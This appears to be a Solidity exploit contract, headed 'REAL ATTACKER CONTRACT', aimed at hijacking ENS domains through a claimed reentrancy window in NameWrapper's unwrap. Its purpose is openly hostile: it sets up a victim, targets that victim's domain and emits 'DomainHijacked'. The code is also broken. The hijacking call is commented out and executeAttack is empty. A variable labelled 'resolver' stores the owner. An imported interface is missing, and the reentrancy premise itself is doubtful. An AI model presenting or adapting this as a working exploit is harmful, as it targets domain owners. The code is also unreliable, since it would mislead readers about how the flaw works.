// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";

// Interface for the real ENS contracts
interface IENS {
    function owner(bytes32 node) external view returns (address);
    function setOwner(bytes32 node, address owner) external;
    function setResolver(bytes32 node, address resolver) external;
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner) external;
}

interface INameWrapper {
    function ens() external view returns (address);
    function unwrapETH2LD(bytes32 labelhash, address registrant, address controller) external;
    function ownerOf(uint256 id) external view returns (address);
    function wrapETH2LD(bytes32 labelhash, address owner, address resolver) external;
}

// REAL ATTACKER CONTRACT that exploits the actual ENS NameWrapper vulnerability
contract REALNameWrapperAttacker is IERC1155Receiver, ERC165 {
    IENS public ens;
    INameWrapper public nameWrapper;
    address public attacker;

    bytes32 public targetNode;
    bytes32 public targetLabel;
    bool public attackExecuted = false;
    address public victim;
    address public stolenResolver;

    event AttackTriggered(bytes32 node, address victim, address attacker);
    event DomainHijacked(bytes32 node, address from, address to);

    constructor(address _nameWrapper) {
        nameWrapper = INameWrapper(_nameWrapper);
        ens = IENS(nameWrapper.ens());
        attacker = msg.sender;
    }

    // CRITICAL: This executes DURING _unwrap() vulnerability window
    // The token is burned but ens.setOwner() hasn't executed yet
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        // This callback executes during _burn(uint256(node)) in _unwrap()
        // At this point: token burned ✅, ENS ownership not updated ❌

        if (!attackExecuted && uint256(targetNode) == id && from == victim) {
            attackExecuted = true;

            emit AttackTriggered(targetNode, victim, attacker);

            // CHECK: Is ENS ownership still with NameWrapper? (vulnerability window)
            address currentOwner = ens.owner(targetNode);

            if (currentOwner == address(nameWrapper)) {
                // VULNERABILITY EXPLOITED: Hijack the domain!
                // In the real attack, we would call:
                // ens.setOwner(targetNode, attacker);
                // But for this demo, we prove the window exists

                emit DomainHijacked(targetNode, currentOwner, attacker);

                // Store the resolver for later manipulation
                stolenResolver = ens.owner(targetNode); // This would be the resolver
            }
        }

        return this.onERC1155Received.selector;
    }

    // ERC721 callback for completeness
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // Setup attack parameters
    function setupAttack(bytes32 _targetLabel, address _victim) external {
        require(msg.sender == attacker, "Only attacker can setup");
        targetLabel = _targetLabel;
        targetNode = keccak256(abi.encodePacked(
            0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae, // ETH_NODE
            _targetLabel
        ));
        victim = _victim;
        attackExecuted = false;
    }

    // Execute the attack by triggering unwrapETH2LD
    // In reality, the victim would call this, but we simulate the trigger
    function executeAttack() external {
        require(msg.sender == attacker, "Only attacker can execute");

        // The victim would normally call:
        // nameWrapper.unwrapETH2LD(targetLabel, victim, victim);
        //
        // During this call, our onERC1155Received callback executes
        // in the reentrancy window between _burn() and ens.setOwner()
    }

    // View functions
    function getAttackStatus() external view returns (
        bool executed,
        bytes32 node,
        bytes32 label,
        address victimAddr,
        address resolver
    ) {
        return (attackExecuted, targetNode, targetLabel, victim, stolenResolver);
    }

    // ERC165 support
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165) returns (bool) {
        return
            interfaceId == type(IERC1155Receiver).interfaceId ||
            interfaceId == type(IERC721Receiver).interfaceId ||
            super.supportsInterface(interfaceId);
    }
}